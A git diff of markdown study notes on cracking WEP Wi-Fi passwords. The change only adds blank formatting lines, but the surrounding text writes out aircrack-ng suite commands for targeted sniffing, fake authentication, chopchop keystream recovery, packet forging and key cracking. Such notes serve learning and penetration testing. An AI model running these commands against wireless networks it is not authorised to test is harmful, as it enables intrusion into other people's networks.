@@ -10,6 +10,7 @@
 #### Perform targetted packet sniffing and crack the password using `aircrack-ng`.
 
 > `airodump-ng --bssid <host-mac> -channel <channel> --write <file> wlan0`
+> 
 > `aircrack-ng <cap file>`
 
 #### More the number of packets captured, higher the chances of password cracking.
@@ -32,7 +33,9 @@
 #### Try to determine the key stream for a packet, and create a new packet with the key stream. Inject this packet into the traffic, hence forcing the AP to generate a new packet with a new IV.
 
 > `airodump-ng --bssid <host-mac> -channel <channel> --write <file> wlan0`
+> 
 > `aireplay-ng --fakeauth 0 -a <host-bssid> -h <adapter-mac> wlan0`
+> 
 > `aireplay-ng --chopchop -b <target-bssid> -h <adapter-mac> wlan0`
 > 
 > `packetforge-ng -0 -a <target> -h <adapter> -k 255.255.255.255 -l 255.255.255.255 -y <keystreamFile(.xor) -w <1*>`
